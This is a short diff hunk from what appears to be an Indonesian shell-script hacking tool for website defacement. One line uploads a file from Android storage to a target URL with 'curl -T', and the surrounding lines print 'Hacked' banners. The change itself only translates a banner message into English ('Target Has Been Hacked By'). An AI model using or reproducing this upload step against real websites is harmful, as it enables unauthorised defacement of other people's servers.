@@ -55,7 +55,7 @@ echo loading..
 curl -T /storage/emulated/0/$script $target
 echo $red
 echo [$target~Hacked] | lolcat
-echo Target Terhack Pada | lolcat
+echo Target Has Been Hacked By $ta on | lolcat
 date | lolcat
 echo $green
 echo terimakasih $ta telah menggunakan tools ini
